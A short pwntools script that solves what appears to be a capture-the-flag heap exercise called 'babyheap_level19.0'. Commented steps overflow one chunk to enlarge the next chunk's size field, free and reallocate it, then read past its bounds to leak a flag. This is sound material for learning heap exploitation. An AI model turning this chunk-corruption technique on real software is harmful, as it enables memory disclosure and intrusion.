from pwn import * 

binary = './babyheap_level19.0_patched'
p = process(binary)

s = '''
b malloc
b free
'''

p.sendline("malloc 0 24")


# the size would be 0x20 and next chunk would be allocated 0x20 bytes after this chunk
p.sendline("malloc 1 24")





p.sendline("safe_read 0")


# now make the size larger
p.sendline(b'A' * 0x10 + p64(0) + p64(0x351)) # the new size field here can be something else, just something large would be good



# free and reallocate 
p.sendline("free 1")



# once we reallocate, we get to enter a new size and we can safe_write with this new size
p.sendline("malloc 2 828")




# but the next chunk is still just 0x20 bytes after the previous one
p.sendline("read_flag")



# now we safe_write with 828 bytes, that's a lot, which would print the flag!
p.sendline("safe_write 2")


gdb.attach(p, s)
p.interactive()
